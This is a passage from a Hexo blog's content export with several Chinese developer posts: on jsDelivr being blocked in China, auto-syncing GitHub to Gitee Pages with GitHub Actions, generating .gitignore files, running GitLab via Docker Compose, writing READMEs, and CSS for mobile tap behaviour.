  </entry>
  <entry>
    <title>今天你的jsdelivr挂了吗</title>
    <url>/2022/05/17/20220517-%E4%BB%8A%E5%A4%A9%E4%BD%A0%E7%9A%84jsdelivr%E6%8C%82%E4%BA%86%E5%90%97/</url>
    <content><![CDATA[<p>今天 jsdelivr 一挂，好多博客都卡。一些静态资源博客，用的都是框架，如 hexo，<code>hexo g -d</code>一顿操作上去，访问博客，半出不来页面。咋回事？<code>F12</code>看看<code>network</code>，都集中卡在前缀为<code>https://cdn.jsdelivr.net</code>。</p>
<p><img src="https://cdn.huatree.top/image-20220517124323708.png" alt="image-20220517124323708"></p>
<span id="more"></span>

<div class="note danger"><p>必要时可细致检查个人站点前端主题、插件、脚本等内容中对 jsdelivr 的引用，以避免由于 jsdelivr 不可及导致的加载卡顿和前端无法正常加载的情况。</p>
</div>

<h2 id="受影响的-jsdelivr"><a href="#受影响的-jsdelivr" class="headerlink" title="受影响的 jsdelivr"></a>受影响的 jsdelivr</h2><p>2022 年 4 月 28 日，多个消息确认 jsdelivr 的至少一个域名（cdn.jsdelivr.net）被 GFW 污染，暂未使用 SNI 阻断。</p>
<p>在 2021 年 12 月，jsdelivr 备案被注销，从而失去了在中国大陆的 CDN 节点，在运营商更改解析后恢复了访问。</p>
<p>据了解，jsdelivr 此前以中国国内合作伙伴网宿科技的名义取得过 ICP 备案。</p>
<p>4 月 29 日更新，下午 GFW 停止污染，jsdelivr 的域名在中国境内可以正常解析。</p>
<p>以为这样就完了吗？然而并没有，就在昨天 5 月 16 日，jsdelivr 再次被污染，并且增加了伴随的 SNI 阻断，尽快着手后事吧。</p>
<h2 id="替代-jsdelivr-的方案"><a href="#替代-jsdelivr-的方案" class="headerlink" title="替代 jsdelivr 的方案"></a>替代 jsdelivr 的方案</h2><h3 id="切换国内静态库"><a href="#切换国内静态库" class="headerlink" title="切换国内静态库"></a>切换国内静态库</h3><p><strong>360 静态库</strong>：<code>cdn.baomitu.com</code></p>
<p>完整同步了<code>cdnjs</code>的内容，并且有提供 Google fonts 加速，通过自家 CDN 加速，前段时间启用了 AWS CloudFront 的海外节点，是目前国内公共 CDN 做的比较好的了。</p>
<p><strong>七牛静态库</strong>：<code>staticfile.org</code></p>
<p>通过自家融合 CDN 加速，海外节点较少不过也表现尚可，缺点就是担心 org 域名后续备案维护的问题。</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>访问速度一般，但不至于一直卡在加载中或白屏状态。</p>
<p><strong>unpkg（推荐）</strong>：<code>https://unpkg.com</code></p>
<p>unpkg 是一个快速的全球内容交付网络，适用于<a href="https://www.npmjs.com/">npm</a>上的所有内容。</p>
<p><strong>cloudflare</strong>：<code>https://cdnjs.cloudflare.com</code></p>
<p>cdnjs.cloudflare.com 是一个超快速、可靠、全球可用的开源库内容交付网络。Cloudflare 与<a href="https://cdnjs.com/">cdnjs 项目</a>的维护者合作，并在发布最新版本时分发它们。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>对免费服务无限制的滥用，最终影响的只能是所有人的体验……</p>
<p>是谁送走了 jsdelivr 呢？在座的各位心中都有自己的答案吧。</p>
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>CDN</tag>
      </tags>
  </entry>
  <entry>
    <title>github同步并自动部署gitee-pages</title>
    <url>/2022/05/18/20220518-github%E5%90%8C%E6%AD%A5%E5%B9%B6%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2gitee-pages/</url>
    <content><![CDATA[<p>由于 Gitee Pages 的访问速度很快，很多朋友会选择 Gitee Pages 部署项目（如：个人博客、开源项目国内镜像站点）。但是它不像 GitHub Pages 那样，一提交代码就能自动更新 Pages，因为 Gitee 的自动部署属于 Gitee Pages Pro 的服务。</p>
<p><img src="https://cdn.huatree.top/image-20220519001003845.png" alt="image-20220519001003845"></p>
<span id="more"></span>

<h2 id="提出需求"><a href="#提出需求" class="headerlink" title="提出需求"></a>提出需求</h2><ul>
<li><input checked="" disabled="" type="checkbox"> github 私仓同步到 gitee 私仓（私仓放源码）</li>
<li><input checked="" disabled="" type="checkbox"> github 公仓同步到 gitee 公仓（公仓放打包后的静态资源）</li>
<li><input checked="" disabled="" type="checkbox"> push 到 github 公仓时，激活自动部署 gitee 公仓静态资源</li>
</ul>
<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>本文以<strong>hexo</strong>框架搭建的 blog 为例，实现提出的需求。</p>
<h3 id="流程图分析"><a href="#流程图分析" class="headerlink" title="流程图分析"></a>流程图分析</h3><p><img src="https://cdn.huatree.top/image-20220518230609385.png" alt="image-20220518230609385"></p>
<h3 id="仓库说明"><a href="#仓库说明" class="headerlink" title="仓库说明"></a>仓库说明</h3><div class="note success"><p>github 上的仓库，如果要作为 github pages 使用，创建的远程仓库就得公开，即 public。gitee 上的仓库没有要求，公仓、私仓都可以作为 gitee pages 使用。</p>
</div>

<h4 id="github-平台"><a href="#github-平台" class="headerlink" title="github 平台"></a>github 平台</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 私仓（放源码），master分支</span></span><br><span class="line">huatree.blog</span><br><span class="line"><span class="comment"># 公仓（放静态资源），gh-pages分支</span></span><br><span class="line">huatree.github.io</span><br></pre></td></tr></table></figure>

<p>创建 GitHub Pages 站点，<a href="https://docs.github.com/cn/pages/getting-started-with-github-pages/creating-a-github-pages-site">详见官方文档</a></p>
<h4 id="gitee-平台"><a href="#gitee-平台" class="headerlink" title="gitee 平台"></a>gitee 平台</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 私仓（放源码），master分支</span></span><br><span class="line">huatree.blog</span><br><span class="line"><span class="comment"># 公仓（放静态资源），ge-pages分支</span></span><br><span class="line">huatree</span><br></pre></td></tr></table></figure>

<p>创建 Gitee Pages 站点，<a href="https://gitee.com/help/articles/4136#article-header0">详见官方文档</a></p>
<h3 id="完整示例"><a href="#完整示例" class="headerlink" title="完整示例"></a>完整示例</h3><h4 id="配置密钥"><a href="#配置密钥" class="headerlink" title="配置密钥"></a>配置密钥</h4><p>在命令行终端或 Git Bash 使用命令 <code>ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code> 生成 SSH Key，注意替换为自己的邮箱。生成的 <code>id_rsa</code> 是私钥，<code>id_rsa.pub</code> 是公钥。(注意此处不要设置密码，生成的公私钥用于下面 GitHub &#x2F; Gitee 的配置，以保证公私钥成对，否则从 GitHub sync Gitee 的同步将会失败。)</p>
<p>在 GitHub 项目的<code>Settings &gt; Secrets&gt;Actions</code>路径下配置好命名为 <code>GITEE_RSA_PRIVATE_KEY</code> 和 <code>GITEE_PASSWORD</code> 的两个密钥。其中：<code>GITEE_RSA_PRIVATE_KEY</code> 存放 <code>id_rsa</code> <strong>私钥</strong>；<code>GITEE_PASSWORD</code> 存放 Gitee 帐号的密码。（注意此处，是在 GitHub 项目即远程仓库的 Settings 中设置，而不是 GitHub 的个人用户 Settings。）</p>
<p><img src="https://cdn.huatree.top/image-20220518232245555.png" alt="image-20220518232245555"></p>
<p>在 GitHub 的个人设置页面<a href="https://github.com/settings/keys">Settings &gt; SSH and GPG keys</a>配置 SSH <strong>公钥</strong>（即：<code>id_rsa.pub</code>），命名随意，或者默认不填。</p>
<p>在 Gitee 的个人设置页面<a href="https://gitee.com/profile/sshkeys">安全设置 &gt; SSH 公钥</a>配置 SSH <strong>公钥</strong>（即：<code>id_rsa.pub</code>），命名随意，或者默认不填。</p>
<h4 id="关注-Gitee-公众号"><a href="#关注-Gitee-公众号" class="headerlink" title="关注 Gitee 公众号"></a>关注 Gitee 公众号</h4><p>关注 Gitee 微信官方公众号，并绑定个人 Gitee 帐号，用于接收帐号登录通知、以及绕过短信验证码校验。</p>
<h4 id="创建-workflow"><a href="#创建-workflow" class="headerlink" title="创建 workflow"></a>创建 workflow</h4><p>在你的 GitHub 项目 <code>.github/workflows/</code> 文件夹下创建一个 <code>.yml</code> 文件，如 <code>sync.yml</code>，内容如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Sync</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span> [<span class="string">master</span>]</span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Sync</span> <span class="string">to</span> <span class="string">Gitee</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">wearerequired/git-mirror-action@master</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="comment"># 注意在 Settings-&gt;Secrets 配置 GITEE_RSA_PRIVATE_KEY</span></span><br><span class="line">          <span class="attr">SSH_PRIVATE_KEY:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITEE_RSA_PRIVATE_KEY</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="comment"># 注意替换为你的 GitHub 源仓库地址</span></span><br><span class="line">          <span class="attr">source-repo:</span> <span class="string">git@github.com:huatree/huatree.blog.git</span></span><br><span class="line">          <span class="comment"># 注意替换为你的 Gitee 目标仓库地址</span></span><br><span class="line">          <span class="attr">destination-repo:</span> <span class="string">git@gitee.com:huatree/huatree.blog.git</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Build</span> <span class="string">Gitee</span> <span class="string">Pages</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">yanglbme/gitee-pages-action@main</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="comment"># 注意替换为你的 Gitee 用户名</span></span><br><span class="line">          <span class="attr">gitee-username:</span> <span class="string">huatree</span></span><br><span class="line">          <span class="comment"># 注意在 Settings-&gt;Secrets 配置 GITEE_PASSWORD</span></span><br><span class="line">          <span class="attr">gitee-password:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITEE_PASSWORD</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="comment"># 注意替换为你的 Gitee 仓库，仓库名严格区分大小写，请准确填写，否则会出错</span></span><br><span class="line">          <span class="attr">gitee-repo:</span> <span class="string">huatree/huatree</span></span><br><span class="line">          <span class="comment"># 要部署的分支，默认是 master，若是其他分支，则需要指定（指定的分支必须存在）</span></span><br><span class="line">          <span class="attr">branch:</span> <span class="string">ge-pages</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>sync.yml</code>文件（末尾需空一行）中，先使用 <a href="https://github.com/wearerequired/git-mirror-action">wearerequired&#x2F;git-mirror-action</a> 将 GitHub 仓库同步到 Gitee 仓库，再使用 <a href="https://github.com/yanglbme/gitee-pages-action">yanglbme&#x2F;gitee-pages-action</a> 实现 Gitee Pages 的自动部署。</p>
<h4 id="本地项目操作"><a href="#本地项目操作" class="headerlink" title="本地项目操作"></a>本地项目操作</h4><p>因为本文以 hexo 为例，所以还需配置项目根目录下的<code>_config.yml</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">git@github.com:huatree/huatree.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">gh-pages</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">git@gitee.com:huatree/huatree.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">ge-pages</span></span><br></pre></td></tr></table></figure>

<p>在项目所在路径下，终端执行命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先同步推送到2个放静态资源的公仓分支（github平台：huatree.github.io/gh-pages，gitee平台：huatree/ge-pages）</span></span><br><span class="line">hexo clean</span><br><span class="line">hexo g -d</span><br><span class="line"><span class="comment"># 再提交到本地仓库</span></span><br><span class="line">git commit -m <span class="string">&quot;content&quot;</span></span><br><span class="line"><span class="comment"># 后同步推送到2个放源码的私仓分支（github平台：huatree.blog/master，github平台：huatree.blog/master）</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>更多 hexo 命令，<a href="https://hexo.io/zh-cn/docs/commands">详见官方文档</a></p>
<div class="note warning"><p><strong>首次</strong>需要<strong>手动</strong>登录 Gitee ，并在指定部署的仓库下选择<strong>服务&gt;Gitee Pages</strong>，启动进行 Gitee Pages 服务的部署，需勾选<strong>强制使用 HTTPS</strong>。</p>
<p>输入命令的顺序，<code>hexo g -d</code>必须放在<code>git push</code>前，不然自动部署 gitee 的时，指定的 gitee 仓库仍是之前的状态，并没有更新。</p>
<p>自动部署的操作原理：本地仓库推送到远程仓库，通过配置的 workflow，触发<code>github actions</code>，Actions 页面上，会打印出执行 workflow 脚本结果。如果执行结果 sucess，我们会在 Gitee 微信公众号收到一条登录通知。这是 workflow 配置上的 Gitee Pages Action 插件帮我们登录到 Gitee 官网，并为我们点击了项目的部署按钮。</p>
</div>

<h4 id="查看运行结果"><a href="#查看运行结果" class="headerlink" title="查看运行结果"></a>查看运行结果</h4><p>在 github 平台的 huatree.blog 仓库的<code>Actions</code>面板中查看。</p>
<p><img src="https://cdn.huatree.top/image-20220518234128162.png" alt="image-20220518234128162"></p>
<p>稍等片刻，手机上会出现 Gitee 微信官方公众号的登录信息提示</p>
<p><img src="https://cdn.huatree.top/image-20220518234644661.png" alt="image-20220518234644661"></p>
<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>访问<a href="https://huatree.github.io/">https://huatree.github.io/</a>和<a href="https://huatree.gitee.io/">https://huatree.gitee.io/</a>，对比部署后的页面是否同步。如果不同步，可能原因如下：</p>
<ol>
<li><p>gitee pages 的部署官方提示，1 分钟内不可连续部署。</p>
</li>
<li><p>gitee pages 部署失败，并不是自动部署的配置出错或没执行，而是部署的内容违规了。</p>
<p><img src="https://cdn.huatree.top/image-20220519182047703.png" alt="image-20220519182047703"></p>
</li>
</ol>
<p>出现内容违规情况，需根据官方要求修改提示指出的源文件（即 github 平台私仓<code>huatree.blog</code>下的源文件，并非公仓下的静态资源。静态资源是源文件打包后的结果，改动源文件，再打包部署，对应的静态资源自然得以更新）。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://github.com/marketplace/actions/gitee-pages-action">Gitee Pages Action</a></p>
]]></content>
      <categories>
        <category>生活滋味</category>
      </categories>
      <tags>
        <tag>github actions</tag>
        <tag>static pages</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>3种方法产生gitignore文件</title>
    <url>/2022/05/21/20220521-3%E7%A7%8D%E6%96%B9%E6%B3%95%E4%BA%A7%E7%94%9Fgitignore%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>当项目不方便管理，偶尔有定制性需求，有冗余的内容……我们可以拥有<code>gitignore</code>陪伴。</p>
<p><img src="https://cdn.huatree.top/image-20220521130010640.png" alt="image-20220521130010640"></p>
<span id="more"></span>

<h2 id="github-x2F-gitignore"><a href="#github-x2F-gitignore" class="headerlink" title="github&#x2F;gitignore"></a>github&#x2F;gitignore</h2><p>这是 GitHub 的<a href="http://git-scm.com/docs/gitignore"><code>.gitignore</code></a>文件模板集合。在创建新的存储库和文件时，我们使用此列表来填充<code>.gitignore</code>GitHub.com 界面中可用的模板选择器。</p>
<p>有关<code>.gitignore</code>文件如何工作以及如何使用它们的更多信息，以下资源是一个很好的起点：</p>
<ul>
<li><a href="http://git-scm.com/book">Pro Git</a>书籍的<a href="https://git-scm.com/book/en/Git-Basics-Recording-Changes-to-the-Repository#_ignoring">忽略文件章节</a>。</li>
<li>GitHub 帮助站点上的<a href="https://help.github.com/articles/ignoring-files">忽略文件文章。</a></li>
<li>gitignore <a href="http://git-scm.com/docs/gitignore">(5)</a>手册页。</li>
</ul>
<p><a href="https://github.com/github/gitignore">更多信息详见</a></p>
<h2 id="gitignore-io"><a href="#gitignore-io" class="headerlink" title="gitignore.io"></a>gitignore.io</h2><p><code>gitignore.io</code>是一个 Web 服务，旨在帮助您为 Git 存储库创建 <code>.gitignore</code> 文件。</p>
<p><a href="https://docs.gitignore.io/">官方使用说明</a></p>
<p><a href="https://www.toptal.com/developers/gitignore">更多信息详见</a></p>
<h2 id="gitignore-Generator-for-Visual-Studio-Code"><a href="#gitignore-Generator-for-Visual-Studio-Code" class="headerlink" title=".gitignore Generator for Visual Studio Code"></a>.gitignore Generator for Visual Studio Code</h2><p><a href="https://gitignore.io/">让您使用 gitignore.io</a> API 轻松快速地<code>.gitignore</code>为您的项目生成文件。</p>
<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul>
<li><strong>便于使用</strong></li>
<li><strong>smart</strong> - 让您更新现有<code>.gitignore</code>文件</li>
<li><strong>自定义规则</strong>- 在更新时保留用户定义的规则</li>
<li><strong>轻量级</strong>- 没有外部依赖！</li>
</ul>
<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>此扩展程序的主要目的是生成<code>.gitignore</code>文件，但它也足够聪明，可以知道您是否已经拥有一个文件，或者您是否向其中添加了自定义规则。它也是操作系统感知的，因此它会为您预先检查该复选框。</p>
<p>要使用扩展，请转到<strong>命令面板</strong>（<code>Shift+CMD+P</code>在 macOS 或<code>Shift+CTRL+P</code>Windows 上）并启动<code>Generate .gitignore File</code>命令。</p>
<h3 id="案例-：您还没有-gitignore-文件"><a href="#案例-：您还没有-gitignore-文件" class="headerlink" title="案例 ：您还没有 .gitignore 文件"></a>案例 ：您还没有 .gitignore 文件</h3><p>如果您还没有<code>.gitignore</code>文件，系统会立即提示您提供所有可用工具、框架等可供选择的列表。<code>Space</code>您可以通过单击复选框来选择或取消选择项目。模糊搜索也可用于加快速度。</p>
<p>完成后按 Return ( <code>Enter</code>)，您的<code>.gitignore</code>文件将生成并保存在磁盘上。</p>
<p><img src="https://github.com/piotrpalarz/vscode-gitignore-generator/raw/master/images/readme/1.gif" alt="3url-01"></p>
<p>有关更多详细信息，请参阅<a href="https://marketplace.visualstudio.com/items?itemName=piotrpalarz.vscode-gitignore-generator">.gitignore Generator</a></p>
<h2 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h2><p>开发中常遇到的一类问题：</p>
<p>当我们发现已 push 的文件，本不应该 push 上去，而是走<code>.gitignore</code>，却因<code>.gitignore</code>文件中漏掉了该文件的排除。等再次加入到<code>.gitignore</code>中，<code>git status</code>时，它不起作用了。</p>
<p>想要挽回失误，可以有如下操作：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除暂存区文件前查看工作区状态</span></span><br><span class="line">git status</span><br><span class="line"><span class="comment"># 删除暂存区文件（不会改变工作区和本地版本库）</span></span><br><span class="line">git <span class="built_in">rm</span> --cached -r .</span><br><span class="line"><span class="comment"># 删除暂存区文件后再次查看工作区状态</span></span><br><span class="line">git status</span><br><span class="line"><span class="comment"># 如果需要一次添加所有文件到暂存区</span></span><br><span class="line">git add .</span><br><span class="line"><span class="comment"># or 添加单个或几个</span></span><br><span class="line">git add &lt;file1&gt; &lt;file2&gt; &lt;...&gt;</span><br><span class="line"><span class="comment"># 提交到本地版本库</span></span><br><span class="line">git commit -m <span class="string">&quot;content&quot;</span></span><br><span class="line"><span class="comment"># 推送到上游版本库</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure>

<p>这样，你本地需要忽略的指定文件或目录仍在，上游版本库即远程仓库则没有，<code>.gitignore</code>生效。</p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>gitlab搭建与使用</title>
    <url>/2022/05/21/20220521-gitlab%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>GitLab 让开发团队对他们的代码仓库拥有更多的控制，相对于 GitHub，它有不少的特色：允许免费设置仓库权限；可以设置获取到团队整体的改进进度。</p>
<p><img src="https://cdn.huatree.top/image-20220521203606016.png" alt="image-20220521203606016"></p>
<span id="more"></span>

<div class="note info"><p>GitHub 如果使用私有仓库，是需要付费的；而 GitLab 可以在上面搭建私人的免费仓库。</p>
</div>

<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>GitLab 有社区版（免费）和企业版（收费）。本文示例以 GitLab 社区版为准。</p>
<h3 id="Docker-Compose-安装-GitLab"><a href="#Docker-Compose-安装-GitLab" class="headerlink" title="Docker Compose 安装 GitLab"></a>Docker Compose 安装 GitLab</h3><p>使用<code>docker-gitlab</code>仓库中的<a href="https://github.com/sameersbn/docker-gitlab/blob/master/docker-compose.yml">docker-compose.yml</a>。复制到本地<code>compose.yaml</code>中，修改如下部分内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;13980:80&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&#x27;13922:22&#x27;</span></span><br><span class="line"><span class="attr">environment:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">GITLAB_PORT=13980</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">GITLAB_SSH_PORT=13922</span></span><br></pre></td></tr></table></figure>

<p>接着，在该文件所在目录下打开终端，输入<code>docker compsoe up</code>。运行成功后，浏览器打开如下 URL：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:13980</span><br><span class="line"><span class="comment"># 会自动定位到</span></span><br><span class="line">http://127.0.0.1:13980/users/sign_in</span><br></pre></td></tr></table></figure>

<p><code>127.0.0.1</code>可替换成<code>localhost</code>。</p>
<p>默认管理员账号为 <strong>root</strong>，根据页面提示<code>Please create a password for your new account.</code>设置<code>New password</code>。</p>
<p><img src="https://cdn.huatree.top/image-20220521191137698.png" alt="image-20220521191137698"></p>
<p>点击<strong>Change your password</strong>，跳转到登录页面，使用<code>root</code>和刚设置的密码登录。</p>
<p><img src="https://cdn.huatree.top/image-20220521191623991.png" alt="image-20220521191623991"></p>
<p>初次登录成功后的页面如下</p>
<p><img src="https://cdn.huatree.top/image-20220521192006609.png" alt="image-20220521192006609"></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>根据实际情况，可切换中文页面方便使用：</p>
<p>点击右上角头像 &gt; Preferences &gt; Localization &gt; 设置简体中文并点击保存，切换其他页面生效。</p>
<h3 id="GitLab-的权限控制"><a href="#GitLab-的权限控制" class="headerlink" title="GitLab 的权限控制"></a>GitLab 的权限控制</h3><p>以默认的<code>GitLab Instance/Monitoring</code>仓库为例剖析。进入该页面，点击<strong>邀请成员</strong>，弹窗如下所示。</p>
<p><img src="https://cdn.huatree.top/image-20220521195929833.png" alt="image-20220521195929833"></p>
<p>相关角色详细信息，点击<strong>了解更多</strong>。</p>
<p>更多权限与角色信息，<a href="https://docs.gitlab.com/ee/user/permissions.html#permissions-and-roles">详见官方文档</a></p>
<p>管理员使用 GitLab 一般会考虑的点：</p>
<ul>
<li>以组为单元，设置管理员</li>
<li>熟悉 Merge Request，写好 git commit</li>
<li>及时回收权限，或者设置过期时间</li>
</ul>
<p>有人可能会问，GitHub 有没有 GitLab 群组的感觉呢。答案是有的，与 GitHub 的<a href="https://github.com/organizations/plan">organizations</a>项对应。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://docs.gitlab.com/ee/install/docker.html">GitLab Docker images</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title>写好README</title>
    <url>/2022/06/03/20220603-%E5%86%99%E5%A5%BDREADME/</url>
    <content><![CDATA[<p><img src="https://cdn.huatree.top/image-20220603172009054.png" alt="image-20220603172009054"></p>
<span id="more"></span>

<h2 id="从何而来"><a href="#从何而来" class="headerlink" title="从何而来"></a>从何而来</h2><p>“README”可能是来自于《爱丽丝漫游仙境》，其中一瓶药水和一个月饼上分别贴着“DRINK ME”（喝我）和“EAT ME”（吃我）的标签。 —— 来自某位读者的提议</p>
<p>正式命名的日期可以追溯到<strong>至少</strong> 1970 年。不过也有可能是来自更早之前放在打孔卡片上的便签纸，上面潦草地写着的“READ ME!”。</p>
<h2 id="项目都有它的身影"><a href="#项目都有它的身影" class="headerlink" title="项目都有它的身影"></a>项目都有它的身影</h2><p>为什么？没有 README 意味着开发者需要阅读源码才能理解你的模块。</p>
<p>对于开发者，项目都是持续集成的，如果没有 README，相隔一段时间，再回来折腾项目，会感觉很陌生。</p>
<p>对于使用者，如果没有 README，就需要耗费大量的时间去解读项目源码，或者带着复杂的心情直接抛弃，找个有 README 提供的项目替代使用。</p>
<h2 id="怎么写"><a href="#怎么写" class="headerlink" title="怎么写"></a>怎么写</h2><p>README 的编写质量决定了是否能给人留下好的第一印象。</p>
<p>README 是使用者首先（或唯一）审视你作品的入口。用户希望模块能满足他们的需要，所以你要清楚的说明你的模块的主要作用和优势。</p>
<p>你要做的是：</p>
<ol>
<li>告诉他们这是什么 (使用场景)</li>
<li>告诉他们在实际使用中是什么样子</li>
<li>告诉他们使用的方法</li>
<li>告诉他们其它相关的细节</li>
</ol>
<h2 id="README-清单"><a href="#README-清单" class="headerlink" title="README 清单"></a>README 清单</h2><p>一个有用的清单用来衡量你的 README</p>
<ul>
<li>一句话解释模块的目的</li>
<li>必要的背景资料或链接</li>
<li>为潜在不熟悉的术语提供到信息来源的链接</li>
<li>简洁可运行的实例</li>
<li>安装说明</li>
<li>详细的 API 文档</li>
<li>对<a href="https://github.com/hackergrrl/art-of-readme/blob/master/README-zh.md#%E8%AE%A4%E7%9F%A5%E6%BC%8F%E6%96%97">认知漏斗</a>的执行</li>
<li>前面提到的注意事项和限制</li>
<li>不要依赖图片传递关键信息</li>
<li>许可证</li>
</ul>
<div class="note info"><p><strong>认知漏斗</strong>， 可以想象成是一个直立的漏斗，最宽的部分相关细节最宽泛，越往下移动细节越具体，只有对你的作品足够感兴趣的人才会关注这部分内容。</p>
</div>

<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://github.com/hackergrrl/art-of-readme">Art of README</a></p>
<p>[2] <a href="https://github.com/othneildrew/Best-README-Template">Best-README-Template</a></p>
<p>[3] <a href="https://github.com/RichardLitt/standard-readme">standard-readme</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>README</tag>
      </tags>
  </entry>
  <entry>
    <title>移动端H5页面禁止长按复制及去掉点击高亮</title>
    <url>/2022/06/06/20220606-%E7%A7%BB%E5%8A%A8%E7%AB%AFH5%E9%A1%B5%E9%9D%A2%E7%A6%81%E6%AD%A2%E9%95%BF%E6%8C%89%E5%A4%8D%E5%88%B6%E5%8F%8A%E5%8E%BB%E6%8E%89%E7%82%B9%E5%87%BB%E9%AB%98%E4%BA%AE/</url>
    <content><![CDATA[<p>指定的移动端 H5 页面，长按文字拉起复制面板，对用户体验不友好。活动 H5 页面点击区域闪现高亮。</p>
<p><img src="https://cdn.huatree.top/image-20220606211508208.png" alt="image-20220606211508208"></p>
<span id="more"></span>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="禁止长按复制"><a href="#禁止长按复制" class="headerlink" title="禁止长按复制"></a>禁止长按复制</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">  -webkit-user-select: none; <span class="comment">/* webkit浏览器 */</span></span><br><span class="line">  -webkit-touch-callout: none; <span class="comment">/* 系统默认菜单被禁用 */</span></span><br><span class="line">  -khtml-user-select: none; <span class="comment">/* 早期浏览器 */</span></span><br><span class="line">  -moz-user-select: none; <span class="comment">/* 火狐 */</span></span><br><span class="line">  -ms-user-select: none; <span class="comment">/* IE10 */</span></span><br><span class="line">  user-select: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">input</span>,</span><br><span class="line"><span class="selector-tag">textarea</span> &#123;</span><br><span class="line">  -webkit-user-select: auto;</span><br><span class="line">  user-select: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="去掉点击高亮"><a href="#去掉点击高亮" class="headerlink" title="去掉点击高亮"></a>去掉点击高亮</h3><p>默认情况下，当用户点击链接或 JavaScript 可点击元素时，iOS 上的 Safari 会以透明灰色突出显示该区域。使用<code>-webkit-tap-highlight-color</code>CSS 属性，您可以修改或禁用网页上的此默认行为。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">  -webkit-tap-highlight-<span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  -webkit-tap-highlight-<span class="attribute">color</span>: transparent; <span class="comment">/* For some Androids */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

